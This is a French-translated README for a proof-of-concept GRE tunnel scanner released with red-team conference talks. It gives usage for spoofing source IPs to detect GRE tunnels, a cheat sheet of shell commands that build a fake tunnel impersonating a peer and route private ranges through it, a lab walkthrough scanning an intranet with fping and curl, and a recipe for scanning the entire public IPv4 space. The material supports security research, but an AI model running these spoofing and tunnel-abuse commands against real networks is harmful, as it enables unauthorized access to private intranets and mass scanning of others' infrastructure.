# Scanner de tunnel GRE
## ⚠️⚠️⚠️ IMPORTANT ⚠️⚠️⚠️
### ⚠️Cet outil inclut la falsification des adresses IP source. Veuillez vous assurer que vous disposez d'une autorisation légale pour l'utiliser.⚠️
## Référence
- Ceci est un code PoC pour les conférences : From Spoofing to Tunneling: New Red Team's Networking Techniques for Initial Access and Evasion
    - [Black Hat USA 2025 Briefing](https://www.blackhat.com/us-25/briefings/schedule/#from-spoofing-to-tunneling-new-red-teams-networking-techniques-for-initial-access-and-evasion-44678)
    - [DEF CON 33 Main Stage](https://defcon.org/html/defcon-33/dc-33-speakers.html#content_60316)
    - [HITCON 2025](https://hitcon.org/2025/en-US/agenda/)
## Préparation
- `pip3 install requirement.txt`
## Utilisation
```
python3 main.py -i <interface> -lh <your_public_IP> -s <gre_src_ip_subnet or ip_list_file> -d  <gre_dst_ip_subnet or ip_list_file> -o <logfile>
```
## Exemple
- par exemple `1.1.1.1` et `2.2.2.2` ont un tunnel gre, vous êtes `3.3.3.3`
```
python3 main.py  -i eth0 -lh 3.3.3.3 -s 1.1.1.1 -d 2.2.2.2
INFO - sending gresrc 1.1.1.1, gredst 2.2.2.2
CRITICAL - Received reply from 2.2.2.2 GRE peer: 1.1.1.1
```
- Et comprendre comment exploiter un tunnel GRE
```
python3 main.py  -i eth0 -lh 3.3.3.3 -s 1.1.1.1 -d 2.2.2.2 -sch -l3
########################## output ##########################
#### Create Fake Tunnel ####
IFACE=eth0
MYPUBIP=3.3.3.3
SRCADDR=1.1.1.1
DSTADDR=2.2.2.2
ip addr add  $SRCADDR/32 dev $IFACE
ip r add $DSTADDR dev $IFACE src $SRCADDR
ip tunnel add gre1 mode gre local $SRCADDR remote $DSTADDR ttl 255
ip link set gre1 up mtu 1280

## route possible private ip ##
ip r add 10.0.0.0/8 dev gre1 src $MYPUBIP
ip r add 172.16.0.0/12 dev gre1 src $MYPUBIP
ip r add 192.168.0.0/16 dev gre1 src $MYPUBIP

### start scan intranet ###
#### !IMPORTANT! ####
# !! nmap is not available for this kind of attack use fping instead !! #
# fping -g 192.168.0.0/16

### cleanup ###
ip addr del $SRCADDR/32 dev $IFACE
ip tunnel del gre1
```

- si vous connaissez le point de terminaison mais pas l'adresse du pair, vous pouvez faire quelque chose comme ceci  
  - `python3 main.py  -i eth0 -l3 -lh 3.3.3.3 -s 1.1.1.0/24 -d 2.2.2.2 -id 8.8.8.8`  
  - vous recevrez une réponse de 8.8.8.8 tout en obtenant le bon pair  

- réglage par défaut environ 500 paquets/seconde.  
## options  
- `-sch` : Affiche la feuille de triche et quitte (Entrez -i -lh -s -d que vous avez trouvé puis obtenez la commande d'abus du tunnel GRE)  
- `-l3` : Interface tunnel couche 3 (Par défaut : Faux)  
- `-r` : Place l’IP de destination GRE dans ICMP (Par défaut : Place l’IP source GRE)  
- `-ss` : Sauvegarde et utilise un fichier d’état (la dernière analyse reprendra) (Par défaut : Faux)  
  - Recommandé "on" dans un système de scan massif, parfois le script plante  
- `-i <interface>` : Interface pour envoyer les paquets  
- `-s <ip_ou_fichier>` : Un sous-réseau IP ou une liste d’IPs (sous-réseaux) à utiliser comme source GRE  
- `-d <ip_ou_fichier>` : Un sous-réseau IP ou une liste d’IPs (sous-réseaux) à utiliser comme destination GRE  
- `-L <fichier>` : scanner une liste de pairs GRE  
  - fichier, chaque ligne ressemble à ceci `1.1.1.1,2.2.2.2`  
- `-lh <ip>` : Une IP sur votre interface publique (l’IP sur l’interface -i)  
- `-o <fichier>` : Chemin du fichier log  
- `-t <float>` : Attendre combien de secondes après l’envoi du paquet GRE (Par défaut : 2)  
- `-T <int>` : Combien de threads envoient des paquets GRE en même temps (Par défaut : 255)  
- `-cs <int>` : Envoyer combien d’IPs avant de commencer à attendre la réponse ping (par défaut : 1000)  
- `-dp` : Faire privé - scanner les IP privées GRE (Par défaut : Faux)  
- `-id <ip>` : Adresse destination dans ICMP (Par défaut : même que la destination GRE)  
  - Utilisez ceci si vous connaissez l’adresse intranet interne  
- `-v <niveau_log>` : Niveau de log `['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL']` (Par défaut : INFO)  
  - Le log de détection de pair GRE est sur `CRITICAL`  


## meilleure façon de scanner l’IP publique complète
```
wget https://bgp.tools/table.txt
cat table.txt |grep -v "::"|cut -d " " -f 1 > v4table.txt
pip3 install aggregate6
aggregate6 v4table.txt > aggrv4table.txt
#cat aggrv4table.txt|wc -l   #159652
python3 main.py -i  <interface> -lh <your_public_IP> -s aggrv4table.txt -d <your_target> -ss
```

## Laboratoire
### Vidéo de démonstration
- [Youtube](https://youtu.be/DDvfYl5-J28)
### Scanner un tunnel GRE
`python3 main.py -i <iface> -lh <votre_ip> -s 1.1.1.1 -d 160.25.104.199`
### Accéder et scanner l'intranet
```
#### Create Fake Tunnel ####
IFACE=eth0  #change this 
MYPUBIP=9.9.9.9  #change this
GATEWAY=1.2.3.4 #change this
SRCADDR=1.1.1.1 # lab info don't change
DSTADDR=160.25.104.199 # lab info don't change
ip addr add $SRCADDR/32 dev $IFACE
ip r add $DSTADDR dev $IFACE via $GATEWAY src $SRCADDR
ip tunnel add gre1 mode gre local $SRCADDR remote $DSTADDR ttl 255
ip link set gre1 up mtu 1280
### start scan intranet ###
fping -g 192.168.0.0/16

##### scan output #####
# 192.168.1.2 is alive

## test curl to web ##
curl 192.168.1.2
# YOU KNOW GRE!

#### cleanup ####
ip addr del $SRCADDR/32 dev $IFACE
ip tunnel del gre1
```
## Avertissement  
Ce projet est destiné uniquement à des fins éducatives et de recherche. Toute action et/ou activité liée à ce code est de votre seule responsabilité. Les auteurs et contributeurs ne sont pas responsables de toute mauvaise utilisation ou dommage causé par ce projet. Veuillez vous assurer que vous disposez des autorisations appropriées avant de tester, utiliser ou déployer une partie de ce code dans n'importe quel environnement. L'utilisation non autorisée de ce code peut enfreindre les lois locales, étatiques et fédérales.  

## Licence  
Ce projet est sous licence MIT.




---

Tranlated By [Open Ai Tx](https://github.com/OpenAiTx/OpenAiTx) | Last indexed: 2025-10-11

---